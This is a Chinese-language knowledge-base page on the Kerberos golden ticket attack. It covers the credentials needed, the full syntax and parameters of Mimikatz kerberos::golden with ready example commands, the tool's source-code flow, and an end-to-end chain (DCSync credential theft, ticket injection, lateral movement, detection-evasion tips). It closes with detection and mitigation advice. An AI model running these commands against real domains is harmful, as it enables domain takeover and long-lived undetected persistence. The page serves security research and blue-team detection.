---
title: Kerberos 黄金票据攻击原理与 Mimikatz 实现深度解析
description: 系统梳理 Kerberos 黄金票据攻击原理（伪造 TGT）、必要凭证（KRBTGT Hash、Domain SID）及加密类型对比，结合
  Mimikatz 源码分析 kerberos::golden 命令实现细节与内网渗透利用链路。
category: ai-security
tags:
- Kerberos
- Golden Ticket
- Mimikatz
- 内网渗透
- 域渗透
- 源码分析
- KRBTGT
- 权限维持
date: 2023-04-15
updated: '2026-11-14'
---

## 概述

**黄金票据** 是针对 Kerberos 认证协议的一种高权限持久化攻击技术。攻击者在获取域控制器的 **KRBTGT 账号 NTLM Hash** 与 **域 SID** 后，可离线伪造任意用户的 **TGT（Ticket Granting Ticket）**，从而在域内横向移动、访问任意服务，且无需与 KDC（Key Distribution Center）交互，极难被检测。

本页面基于 0x00实验室 微信归档文章《从黄金票据的生成分析Mimikatz工具底层工作原理》，结合 Mimikatz 源码，系统梳理攻击原理、凭证获取、加密类型对比、命令参数详解及核心函数实现流程。

> 文章来源：[[0x00lab-wechat-archive-202108-202304]]（0x00实验室微信归档 2021.08–2023.04）

---

## 攻击原理

### Kerberos 认证流程简述

1. **AS-REQ/AS-REP**：客户端向 KDC 请求 TGT，KDC 使用 KRBTGT Hash 加密 TGT 返回。
2. **TGS-REQ/TGS-REP**：客户端持 TGT 向 KDC 请求服务票据（ST），KDC 验证 TGT 后签发 ST。
3. **AP-REQ/AP-REP**：客户端持 ST 访问目标服务。

### 黄金票据伪造逻辑

- TGT 由 KDC 使用 **KRBTGT 账号的密钥** 加密签名。
- 若攻击者掌握 **KRBTGT NTLM Hash**（或 AES Key）与 **域 SID**，即可离线构造任意用户的 TGT（PAC 中嵌入任意 SID、RID、组成员身份）。
- 伪造的 TGT 可直接用于 **TGS-REQ** 获取任意服务票据，实现 **Pass-the-Ticket (PtT)**。

> 核心前提：域控权限泄露（如 DCSync、NTDS.dit 导出、LSADump）导致 KRBTGT Hash 被窃取。

---

## 必要凭证与参数

| 参数 | 说明 | 获取途径 |
|------|------|----------|
| **Domain Name** | 域 FQDN（如 `cyber.com`） | `ipconfig /all`、`nltest /dsgetdc:domain` |
| **Domain SID** | 域安全标识符（如 `S-1-5-21-1923088019-4105411894-1236499359`） | `whoami /user`、PowerView `Get-DomainSID`、Mimikatz `lsadump::dcsync` |
| **KRBTGT Hash** | KRBTGT 账号的 NTLM/AES 密钥 | `lsadump::dcsync /domain:xxx /user:krbtgt`、NTDS.dit 解析 |
| **User Name** | 伪造的目标用户名（任意，如 `administrator`） | 自定义 |
| **User RID** | 用户相对标识符（默认 500 为内置 Administrator） | 可选，默认 500 |
| **Groups / Extra SIDs** | 伪造的组成员、额外 SID（用于权限提升） | 可选 |
| **Encryption Type** | 加密算法（RC4、AES128、AES256、DES） | 根据 KRBTGT 密钥类型选择 |

---

## 加密类型对比

| 加密类型 | 常量 | 密钥长度 | 适用场景 | 备注 |
|----------|------|----------|----------|------|
| **DES_CBC_MD5** | `KERB_ETYPE_DES_CBC_MD5` | 8 字节 | 旧版兼容 | 已弃用，不推荐 |
| **RC4_HMAC_NT** | `KERB_ETYPE_RC4_HMAC_NT` | 16 字节 | 兼容性最好 | 默认 `/krbtgt` 对应 NTLM Hash |
| **AES128_CTS_HMAC_SHA1_96** | `KERB_ETYPE_AES128_CTS_HMAC_SHA1_96` | 16 字节 | 现代域环境 | 需域功能级别 ≥ 2008 |
| **AES256_CTS_HMAC_SHA1_96** | `KERB_ETYPE_AES256_CTS_HMAC_SHA1_96` | 32 字节 | 高安全需求 | 最强，推荐优先使用 |

> **实战建议**：优先使用 `/aes256` 或 `/aes128` 指定 AES Key，避免 RC4 被检测；若仅有 NTLM Hash，用 `/rc4` 或 `/krbtgt`。

---

## Mimikatz `kerberos::golden` 命令详解

### 基础语法

```bash
kerberos::golden /user:<UserName> /domain:<FQDN> /sid:<DomainSID> /krbtgt:<KRBTGT_Hash> [/ptt] [/ticket:<Output.kirbi>] [选项]
```

### 核心参数

| 参数 | 别名 | 说明 | 示例 |
|------|------|------|------|
| `/user` | `/admin` | 伪造用户名 | `/user:administrator` |
| `/domain` | — | 域 FQDN | `/domain:cyber.com` |
| `/sid` | — | 域 SID | `/sid:S-1-5-21-...` |
| `/krbtgt` | `/rc4` | KRBTGT NTLM Hash (RC4) | `/krbtgt:d40f0e3b1347e55dbfd6dc58e80a3b6e` |
| `/aes128` | — | KRBTGT AES128 Key | `/aes128:abcdef...` |
| `/aes256` | — | KRBTGT AES256 Key | `/aes256:abcdef...` |
| `/des` | — | KRBTGT DES Key | `/des:abcdef...` |
| `/id` | — | 用户 RID | `/id:500` |
| `/groups` | — | 组 RID 列表（逗号分隔） | `/groups:513,512,520` |
| `/sids` | — | 额外 SID 列表 | `/sids:S-1-5-21-...-519` |
| `/startoffset` | — | 票据生效时间偏移（分钟） | `/startoffset:0` |
| `/endin` | — | 票据有效期（分钟，默认 10 年） | `/endin:5256000` |
| `/renewmax` | — | 最大续期时间（分钟） | `/renewmax:5256000` |
| `/service` | — | 目标服务 SPN（针对 ST 伪造） | `/service:krbtgt` |
| `/target` | — | 目标域/主机 | `/target:dc.cyber.com` |
| `/ticket` | — | 输出文件名（默认 `ticket.kirbi`） | `/ticket:golden.kirbi` |
| `/ptt` | — | 直接注入当前会话（Pass-the-Ticket） | `/ptt` |
| `/rodc` | — | RODC ID（只读域控场景） | `/rodc:0` |
| `/claims` | — | 声明集合（JSON 字符串） | `/claims:"{...}"` |

### 典型示例

```bash
# 仅有 NTLM Hash，输出文件
kerberos::golden /user:administrator /domain:cyber.com /sid:S-1-5-21-1923088019-4105411894-1236499359 /krbtgt:d40f0e3b1347e55dbfd6dc58e80a3b6e /ticket:golden.kirbi

# 拥有 AES256 Key，直接注入内存 (PtT)
kerberos::golden /user:administrator /domain:cyber.com /sid:S-1-5-21-... /aes256:3a2f... /ptt

# 指定组 RID 与额外 SID（模拟 Domain Admins + Enterprise Admins）
kerberos::golden /user:test /domain:cyber.com /sid:S-1-5-21-... /krbtgt:... /id:500 /groups:512,513,519 /sids:S-1-5-21-...-519
```

---

## Mimikatz 源码架构与 `golden` 实现流程

### 入口与命令分发

1. **`wmain()`** (`mimikatz.c`)：程序入口，解析命令行或进入交互循环。
2. **`mimikatz_dispatchCommand()`**：按前缀分发
   - `!` → 内核模块 (`kuhl_m_kernel_do`)
   - `*` → RPC 模块 (`kuhl_m_rpc_do`)
   - 默认 → `mimikatz_doLocal()`
3. **`mimikatz_doLocal()`**：
   - 将输入按 `::` 分离为 **模块名** 与 **命令名**。
   - 遍历全局 `mimikatz_modules[]`（`KUHL_M*` 数组）匹配模块 `shortName`。
   - 在模块的 `commands[]`（`KUHL_M_C` 数组）中匹配 `command` 字符串。
   - 调用 `pCommand(argc-1, argv+1)` 执行具体功能。

### 模块与命令数据结构

```c
// 模块定义
typedef struct _KUHL_M {
    const wchar_t *shortName;        // 如 "kerberos"
    const wchar_t *fullName;
    const wchar_t *description;
    unsigned short nbCommands;       // 命令数量
    const KUHL_M_C *commands;        // 命令数组指针
    PKUHL_M_C_FUNC_INIT pInit;
    PKUHL_M_C_FUNC_INIT pClean;
} KUHL_M;

// 命令定义
typedef struct _KUHL_M_C {
    PKUHL_M_C_FUNC pCommand;         // 实现函数指针
    const wchar_t *command;          // 如 "golden"
    const wchar_t *description;      // 如 "Willy Wonka factory"
} KUHL_M_C;
```

### Kerberos 模块命令表 (`kuhl_m_c_kerberos`)

| Index | Command | Function | Description |
|-------|---------|----------|-------------|
| 0 | `ptt` | `kuhl_m_kerberos_ptt` | Pass-the-ticket |
| 1 | `list` | `kuhl_m_kerberos_list` | 列举票据 |
| 2 | `ask` | `kuhl_m_kerberos_ask` | 请求 TGS |
| 3 | `tgt` | `kuhl_m_kerberos_tgt` | 获取当前 TGT |
| 4 | `purge` | `kuhl_m_kerberos_purge` | 清除票据 |
| **5** | **`golden`** | **`kuhl_m_kerberos_golden`** | **黄金票据生成** |
| 6 | `hash` | `kuhl_m_kerberos_hash` | 密码转密钥 |
| ... | ... | ... | ... |

---

## `kuhl_m_kerberos_golden` 核心逻辑详解

函数签名：`NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])`

### 参数解析与密钥类型确定

```c
// 依次判断 /des /rc4|/krbtgt /aes128 /aes256
if (kull_m_string_args_byName(..., L"des", ...))       keyType = KERB_ETYPE_DES_CBC_MD5;
else if (kull_m_string_args_byName(..., L"rc4", ...) ||
         kull_m_string_args_byName(..., L"krbtgt", ...)) keyType = KERB_ETYPE_RC4_HMAC_NT;
else if (kull_m_string_args_byName(..., L"aes128", ...)) keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
else if (kull_m_string_args_byName(..., L"aes256", ...)) keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
```

- 调用 `CDLocateCSystem(keyType, &pCSystem)` 定位加密套件（AES 仅 NT6+ 支持）。
- `kull_m_string_stringToHex(szKey, key, pCSystem->KeySize)` 将十六进制字符串转字节数组，并校验长度。

### 时间窗口构造

```c
GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
// startoffset 分钟向前偏移
*(PULONGLONG)&lifeTimeData.TicketStart -= ...;
// endin / renewmax 分钟向后扩展（默认 10 年）
*(PULONGLONG)&lifeTimeData.TicketEnd   += ...;
*(PULONGLONG)&lifeTimeData.TicketRenew += ...;
```

### SID 与 NetBIOS 域名处理

```c
ConvertStringSidToSid(szSid, (PSID*)&pSid);  // 字符串 SID → 二进制 PSID
// 从 FQND 截取第一个 '.' 前部分并大写 → NetBIOS 域名
baseDot = wcschr(szDomain, L'.');
netbiosDomain = towupper(szDomain[0..baseDot));
```

### PAC 扩展数据构造

- **Groups**：`kuhl_m_pac_stringToGroups(szGroups, &groups, &nbGroups)` 解析 `/groups` 为 `GROUP_MEMBERSHIP[]`。
- **Extra SIDs**：`kuhl_m_pac_stringToSids(szSids, &sids, &nbSids)` 解析 `/sids` 为 `KERB_SID_AND_ATTRIBUTES[]`。
- **Claims**：`kuhl_m_kerberos_claims_createFromString(szClaims)` 解析 `/claims` JSON。

### 票据生成核心：`kuhl_m_kerberos_golden_data()`

```c
BerApp_KrbCred = kuhl_m_kerberos_golden_data(
    szUser, szDomain, szService, szTarget,
    &lifeTimeData, key, pCSystem->KeySize, keyType,
    pSid, netbiosDomain, id, groups, nbGroups,
    sids, nbSids, rodc, pClaimsSet
);
```

该函数内部完成：
1. 构造 **KRB-CRED** ASN.1 结构（含 TGT、加密部分、PAC）。
2. PAC 中嵌入：
   - **LogonInfo**：用户 SID、RID、组成员、Extra SIDs、Claims。
   - **Server/Privilege Signature**：分别用 KRBTGT Key、Service Key 签名（黄金票据中二者相同）。
3. 使用 `pCSystem` 提供的加密例程（RC4/AES）对 `EncTicketPart` 加密。
4. 返回 `PBERVAL`（BER 编码的 KrbCred），供写文件或 PtT 使用。

### 输出与清理

- **`/ptt`**：调用 `kuhl_m_kerberos_ptt_data()` 直接提交到 LSA 会话。
- **默认**：`kull_m_file_writeData(filename, ...)` 落盘 `.kirbi`。
- 释放所有 `LocalAlloc` 分配的内存（`pSid`、`netbiosDomain`、`groups`、`sids`、`pClaimsSet`）。

---

## 利用链路与实战注意事项

### 完整攻击链

1. **凭证获取**：
   - DCSync：`lsadump::dcsync /domain:xxx /user:krbtgt`
   - NTDS.dit 导出 + `secretsdump.py` / `ntdsxtract`
   - LSADump：`lsadump::lsa /inject`（需 SYSTEM）
2. **黄金票据生成**：`kerberos::golden ... /ptt` 或落盘。
3. **票据使用**：
   - `kerberos::ptt golden.kirbi` 注入当前会话。
   - `misc::cmd` / `sekurlsa::pth` 启动子进程复用票据。
   - 访问域内任意资源（SMB、LDAP、WinRM、RDP 等）。
4. **持久化**：KRBTGT Hash 不变时，票据长期有效（默认 10 年）；建议定期轮换 KRBTGT 密码（双次重置）失效旧票据。

### 防御与检测

| 检测点 | 手段 |
|--------|------|
| **Event ID 4769 (TGS-REQ)** | 监控异常账号（如已禁用、不存在）请求服务票据 |
| **Event ID 4624 (Logon Type 9)** | PtT 注入产生的 NewCredentials 登录 |
| **PAC 验证** | KDC 校验 PAC 签名（需域功能级别 ≥ 2012 + `ValidateKdcPacSignature`） |
| **KRBTGT 密码轮换** | 双次重置 KRBTGT 密码（间隔 > 复制周期）使旧 Hash 失效 |
| **敏感账号保护** | 将高权账号加入 `Protected Users` 组，禁用 RC4、强制 AES、限制委派 |

---

## 交叉引用与延伸阅读

- **归档索引**：[[0x00lab-wechat-archive-202108-202304]] — 0x00实验室微信归档文章总览
- **工具原理**：[[metasploit-framework-basics-tutorial]] — Metasploit 后渗透模块亦可配合票据利用
- **内网隧道**：[[frp内网渗透应用]] — 结合 Socks5/端口转发实现票据落地后的横向访问
- **凭证导出**：[[hvv-2021-vulnerability-collection]] — HVV 期间常用凭证获取 PoC 聚合
- **Java 反序列化对比**：[[java-deserialization-fundamentals]] — 不同协议栈下的票据/序列化攻击面对比

---

## 结语

黄金票据是域渗透中**最高权限、最隐蔽、持久性最强**的技术之一。其核心在于 **KRBTGT Hash 窃取** 与 **PAC 离线伪造**。Mimikatz 通过模块化架构（`KUHL_M`/`KUHL_M_C`）实现 `kerberos::golden`，源码层面清晰展示了：

1. **参数解析 → 密钥类型选择 → 加密套件定位**
2. **时间窗口、SID、NetBIOS、Groups/SIDs/Claims 组装**
3. **`kuhl_m_kerberos_golden_data` 构造 KRB-CRED 并完成加密签名**
4. **PtT 或落盘双模式输出**

深入理解该流程，有助于红队优化免杀、蓝队定向检测（如监控 `CDLocateCSystem` 调用、异常 PAC 签名）、安全运营制定 KRBTGT 轮换策略。

> **合规提示**：本页面仅供安全研究、授权渗透测试与防御建设参考，严禁未授权实施攻击。

## 来源

- [0x00实验室-202108-202304_028](../sources/0x00实验室-202108-202304_028.md)
